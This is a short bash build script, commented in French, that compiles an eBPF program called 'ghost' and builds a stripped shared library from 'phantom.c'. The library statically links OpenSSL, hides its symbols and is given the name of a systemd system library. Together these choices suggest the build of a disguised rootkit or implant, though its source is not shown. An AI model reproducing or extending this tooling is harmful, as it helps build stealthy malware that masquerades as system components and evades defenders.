#!/bin/bash
set -e
echo "[*] Compilation V9 (Final)..."
rm -f ghost.skel.h ghost.bpf.o libsystemd-core.so

# 1. BPF
if [ ! -f "vmlinux.h" ]; then bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h; fi
clang -g -O2 -target bpf -D__TARGET_ARCH_x86 -c ghost.bpf.c -o ghost.bpf.o
bpftool gen skeleton ghost.bpf.o > ghost.skel.h

# 2. OpenSSL (Assure-toi que le dossier openssl-static existe, sinon décommente les lignes)
# if [ ! -d "openssl-static" ]; then ... (voir versions précédentes) ... fi

# 3. Compilation C (Avec visibilité hidden PAR DÉFAUT, mais code override avec 'default')
gcc -shared -fPIC -o libsystemd-core.so phantom.c \
    -I./openssl-static/include \
    ./openssl-static/lib/libcrypto.a \
    ./openssl-static/lib/libssl.a \
    -Wl,--exclude-libs,ALL \
    -lbpf -lelf -lz -lpthread -ldl \
    -Os -s -fvisibility=hidden

echo "[+] libsystemd-core.so prêt."
